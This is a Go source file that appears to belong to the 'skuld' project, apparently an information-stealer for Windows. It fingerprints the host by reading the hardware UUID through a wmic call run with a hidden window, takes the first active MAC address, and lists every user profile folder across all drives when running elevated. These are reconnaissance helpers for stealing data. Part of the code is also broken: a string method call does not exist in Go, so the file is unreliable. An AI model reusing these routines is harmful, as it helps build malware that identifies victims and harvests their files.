package hardware

import (
	"bytes"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"

	"github.com/hackirby/skuld/utils/program"
	"github.com/shirou/gopsutil/v3/disk"
)

const (
	// DefaultUsersPath is the default Windows users directory path format
	DefaultUsersPath = "%s//Users"
)

// GetHWID retrieves the system's Hardware UUID using WMI
// Returns the UUID as a string or an error if the operation fails
func GetHWID() (string, error) {
	cmd := exec.Command("wmic", "csproduct", "get", "UUID")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	out, err := cmd.Output()
	if err != nil {
		return "", fmt.Errorf("failed to get HWID: %w", err)
	}

	lines := strings.Split(string(out), "\n")
	if len(lines) < 2 {
		return "", fmt.Errorf("invalid HWID output format")
	}

	return strings.TrimSpace(lines[1]), nil
}

// GetMAC retrieves the first active MAC address of the system
// Returns the MAC address as a string or an error if no valid address is found
func GetMAC() (string, error) {
	interfaces, err := net.Interfaces()
	if err != nil {
		return "", fmt.Errorf("failed to get network interfaces: %w", err)
	}

	for _, i := range interfaces {
		if i.Flags&net.FlagUp != 0 && !bytes.Equal(i.HardwareAddr, nil) && !i.Flags.String().Contains("loopback") {
			return i.HardwareAddr.String(), nil
		}
	}

	return "", fmt.Errorf("no valid MAC address found")
}

// GetUsers returns a list of user profile directories in the system
// If not running with elevated privileges, returns only the current user's profile
func GetUsers() []string {
	if !program.IsElevated() {
		userProfile := os.Getenv("USERPROFILE")
		if userProfile != "" {
			return []string{userProfile}
		}
		return []string{}
	}

	var users []string
	drives, err := disk.Partitions(false)
	if err != nil {
		userProfile := os.Getenv("USERPROFILE")
		if userProfile != "" {
			return []string{userProfile}
		}
		return []string{}
	}

	for _, drive := range drives {
		mountpoint := drive.Mountpoint
		usersPath := fmt.Sprintf(DefaultUsersPath, mountpoint)
		
		files, err := os.ReadDir(usersPath)
		if err != nil {
			continue
		}

		for _, file := range files {
			if !file.IsDir() || strings.HasPrefix(file.Name(), ".") {
				continue
			}
			userPath := filepath.Join(usersPath, file.Name())
			if _, err := os.Stat(userPath); err == nil {
				users = append(users, userPath)
			}
		}
	}

	return users
}
